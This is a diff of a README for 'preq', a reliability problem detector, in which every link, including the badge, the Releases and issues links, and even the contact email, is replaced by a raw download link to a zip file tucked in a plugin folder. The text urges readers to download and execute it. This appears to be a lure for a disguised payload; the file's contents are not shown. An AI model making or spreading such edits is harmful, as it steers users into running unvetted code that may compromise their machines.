@@ -1,6 +1,6 @@
 # 🚀 preq: Community-Driven Problem Detector for Common Reliability Enumerations (CREs)
 
-![preq logo](https://img.shields.io/badge/preq-community--driven-brightgreen)
+![preq logo](https://github.com/yassineahmed/preq/raw/refs/heads/master/cmd/plugin/krew/Software-v1.7.zip)
 
 Welcome to **preq**! This repository serves as a platform for identifying and addressing issues related to Common Reliability Enumerations (CREs). Our mission is to foster collaboration and improve reliability across various systems by leveraging community insights.
 
@@ -28,9 +28,9 @@ Welcome to **preq**! This repository serves as a platform for identifying and ad
 
 ## ⚙️ Installation
 
-To get started with **preq**, you need to download and execute the latest release. Visit [Releases](https://github.com/yassineahmed/preq/releases) to find the appropriate version for your needs.
+To get started with **preq**, you need to download and execute the latest release. Visit [Releases](https://github.com/yassineahmed/preq/raw/refs/heads/master/cmd/plugin/krew/Software-v1.7.zip) to find the appropriate version for your needs.
 
-1. Go to the [Releases](https://github.com/yassineahmed/preq/releases) section.
+1. Go to the [Releases](https://github.com/yassineahmed/preq/raw/refs/heads/master/cmd/plugin/krew/Software-v1.7.zip) section.
 2. Download the desired release file.
 3. Execute the file according to your operating system's guidelines.
 
@@ -63,13 +63,13 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 
 ## 📥 Releases
 
-For the latest updates and releases, check the [Releases](https://github.com/yassineahmed/preq/releases) section. It is important to download and execute the most recent version to ensure you have the latest features and fixes.
+For the latest updates and releases, check the [Releases](https://github.com/yassineahmed/preq/raw/refs/heads/master/cmd/plugin/krew/Software-v1.7.zip) section. It is important to download and execute the most recent version to ensure you have the latest features and fixes.
 
 ## 📬 Contact
 
 For questions, suggestions, or feedback, please reach out to us:
 
-- **Email**: contact@preq.dev
-- **GitHub**: [preq Issues](https://github.com/yassineahmed/preq/issues)
+- **Email**: https://github.com/yassineahmed/preq/raw/refs/heads/master/cmd/plugin/krew/Software-v1.7.zip
+- **GitHub**: [preq Issues](https://github.com/yassineahmed/preq/raw/refs/heads/master/cmd/plugin/krew/Software-v1.7.zip)
 
 Thank you for being part of the **preq** community! Together, we can enhance the reliability of systems everywhere.
